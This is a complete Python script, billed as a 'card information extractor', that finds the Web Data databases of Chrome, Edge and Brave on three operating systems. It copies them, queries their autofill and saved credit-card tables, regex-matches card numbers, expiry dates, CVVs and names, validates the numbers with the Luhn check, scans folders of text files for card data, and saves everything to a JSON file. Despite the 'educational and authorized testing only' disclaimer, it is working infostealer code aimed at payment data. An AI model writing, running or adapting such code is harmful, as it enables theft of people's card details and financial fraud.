#!/usr/bin/env python3
"""
Chromium-based Browser Card Information Extractor
Searches for and extracts card information from browser databases.
For educational and authorized security testing purposes only.
"""

import re
import sqlite3
import os
import json
from datetime import datetime
from pathlib import Path


class ChromiumCardExtractor:
    """Extract card information from Chromium-based browsers."""

    # Regex patterns for card detection
    CARD_PATTERNS = {
        'card_number': r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b',
        'expiry_date': r'\b(?:0[1-9]|1[0-2])[/\-](?:20)?[2-9][0-9]\b',
        'cvv': r'\b[0-9]{3,4}\b',
        'cardholder': r'\b[A-Z][a-z]+ [A-Z][a-z]+\b'
    }

    # Common Chromium browser paths
    BROWSER_PATHS = {
        'Chrome': {
            'darwin': '~/Library/Application Support/Google/Chrome/Default',
            'win32': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default'),
            'linux': '~/.config/google-chrome/Default'
        },
        'Edge': {
            'darwin': '~/Library/Application Support/Microsoft Edge/Default',
            'win32': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default'),
            'linux': '~/.config/microsoft-edge/Default'
        },
        'Brave': {
            'darwin': '~/Library/Application Support/BraveSoftware/Brave-Browser/Default',
            'win32': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default'),
            'linux': '~/.config/BraveSoftware/Brave-Browser/Default'
        }
    }

    def __init__(self):
        """Initialize the extractor."""
        self.results = []
        self.current_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    def get_browser_paths(self, platform='darwin'):
        """
        Get browser database paths for the current platform.

        Args:
            platform: OS platform (darwin, win32, linux)

        Returns:
            dict: Browser names and their database paths
        """
        paths = {}
        for browser, platforms in self.BROWSER_PATHS.items():
            if platform in platforms:
                base_path = os.path.expanduser(platforms[platform])
                # Common database files in Chromium browsers
                db_path = os.path.join(base_path, 'Web Data')
                if os.path.exists(db_path):
                    paths[browser] = db_path
        return paths

    def extract_from_text(self, text):
        """
        Extract card information from text using regex patterns.

        Args:
            text: String to search for card information

        Returns:
            dict: Extracted card information
        """
        result = {}

        for field, pattern in self.CARD_PATTERNS.items():
            matches = re.findall(pattern, str(text))
            if matches:
                result[field] = matches

        return result if result else None

    def validate_card_number(self, card_number):
        """
        Validate card number using Luhn algorithm.

        Args:
            card_number: Card number string

        Returns:
            bool: True if valid, False otherwise
        """
        # Remove spaces and dashes
        card_number = re.sub(r'[\s\-]', '', str(card_number))

        if not card_number.isdigit():
            return False

        # Luhn algorithm
        total = 0
        reverse_digits = card_number[::-1]

        for i, digit in enumerate(reverse_digits):
            n = int(digit)
            if i % 2 == 1:
                n *= 2
                if n > 9:
                    n -= 9
            total += n

        return total % 10 == 0

    def identify_card_type(self, card_number):
        """
        Identify card type from card number.

        Args:
            card_number: Card number string

        Returns:
            str: Card type (Visa, MasterCard, Amex, Discover, or Unknown)
        """
        card_number = re.sub(r'[\s\-]', '', str(card_number))

        if re.match(r'^4', card_number):
            return 'Visa'
        elif re.match(r'^5[1-5]', card_number):
            return 'MasterCard'
        elif re.match(r'^3[47]', card_number):
            return 'American Express'
        elif re.match(r'^6(?:011|5)', card_number):
            return 'Discover'
        else:
            return 'Unknown'

    def query_chromium_db(self, db_path):
        """
        Query Chromium database for autofill data.

        Args:
            db_path: Path to Web Data database

        Returns:
            list: Extracted records
        """
        records = []

        try:
            # Create a temporary copy to avoid locking issues
            temp_db = f"{db_path}.temp"
            import shutil
            shutil.copy2(db_path, temp_db)

            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()

            # Query autofill tables
            queries = [
                "SELECT name, value FROM autofill",
                "SELECT name, value, value_lower FROM autofill WHERE name LIKE '%card%'",
                "SELECT * FROM credit_cards" if self._table_exists(cursor, 'credit_cards') else None
            ]

            for query in queries:
                if query:
                    try:
                        cursor.execute(query)
                        rows = cursor.fetchall()
                        records.extend(rows)
                    except sqlite3.OperationalError:
                        continue

            conn.close()
            os.remove(temp_db)

        except Exception as e:
            print(f"Error querying database: {e}")

        return records

    def _table_exists(self, cursor, table_name):
        """Check if table exists in database."""
        cursor.execute(f"SELECT name FROM sqlite_master WHERE type='table' AND name='{table_name}'")
        return cursor.fetchone() is not None

    def search_text_files(self, directory, extensions=['.txt', '.log', '.json', '.csv']):
        """
        Search text files in directory for card information.

        Args:
            directory: Directory to search
            extensions: File extensions to search

        Returns:
            list: Found card information
        """
        results = []

        for root, dirs, files in os.walk(directory):
            for file in files:
                if any(file.endswith(ext) for ext in extensions):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            extracted = self.extract_from_text(content)
                            if extracted:
                                results.append({
                                    'file': file_path,
                                    'data': extracted,
                                    'timestamp': self.current_timestamp
                                })
                    except Exception as e:
                        continue

        return results

    def format_output(self, data, output_format='json'):
        """
        Format extracted data for output.

        Args:
            data: Extracted data
            output_format: Output format (json, dict, str)

        Returns:
            Formatted data
        """
        if output_format == 'json':
            return json.dumps(data, indent=2)
        elif output_format == 'dict':
            return data
        else:
            # String format
            output = []
            for item in data:
                output.append(f"# Found at: {item.get('file', 'N/A')}")
                output.append(f"# Timestamp: {item.get('timestamp', self.current_timestamp)}")
                for key, value in item.get('data', {}).items():
                    output.append(f"{key}: {value}")
                output.append("-" * 50)
            return "\n".join(output)

    def extract_all(self, platform='darwin', search_dirs=None):
        """
        Extract card information from all sources.

        Args:
            platform: OS platform
            search_dirs: Additional directories to search

        Returns:
            dict: All extracted card information
        """
        results = {
            'browser_data': [],
            'file_data': [],
            'summary': {
                'timestamp': self.current_timestamp,
                'total_found': 0
            }
        }

        # Search browser databases
        browser_paths = self.get_browser_paths(platform)
        for browser, db_path in browser_paths.items():
            print(f"# Searching {browser} database...")
            records = self.query_chromium_db(db_path)

            for record in records:
                extracted = self.extract_from_text(str(record))
                if extracted:
                    # Validate card numbers
                    if 'card_number' in extracted:
                        valid_cards = [
                            cn for cn in extracted['card_number']
                            if self.validate_card_number(cn)
                        ]
                        if valid_cards:
                            extracted['card_number'] = valid_cards
                            extracted['card_types'] = [
                                self.identify_card_type(cn) for cn in valid_cards
                            ]

                    results['browser_data'].append({
                        'browser': browser,
                        'data': extracted,
                        'timestamp': self.current_timestamp
                    })

        # Search additional directories
        if search_dirs:
            for directory in search_dirs:
                if os.path.exists(directory):
                    print(f"# Searching directory: {directory}")
                    file_results = self.search_text_files(directory)
                    results['file_data'].extend(file_results)

        # Update summary
        results['summary']['total_found'] = (
            len(results['browser_data']) + len(results['file_data'])
        )

        return results


def main():
    """Main execution function."""
    print("# Chromium Card Information Extractor")
    print(f"# Current timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("#" * 50)

    extractor = ChromiumCardExtractor()

    # Example: Extract from browsers
    results = extractor.extract_all(platform='darwin')

    # Format and display results
    print("\n# Extraction Results:")
    print(extractor.format_output(
        results['browser_data'] + results['file_data'],
        output_format='str'
    ))

    # Save to JSON file
    output_file = f"card_extraction_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(output_file, 'w') as f:
        f.write(extractor.format_output(results, output_format='json'))

    print(f"\n# Results saved to: {output_file}")
    print(f"# Total items found: {results['summary']['total_found']}")


if __name__ == "__main__":
    # WARNING: This tool is for educational and authorized security testing only
    # Unauthorized access to sensitive data is illegal
    print("# WARNING: For educational and authorized security testing only")
    print("# Ensure you have proper authorization before running this tool\n")
    main()
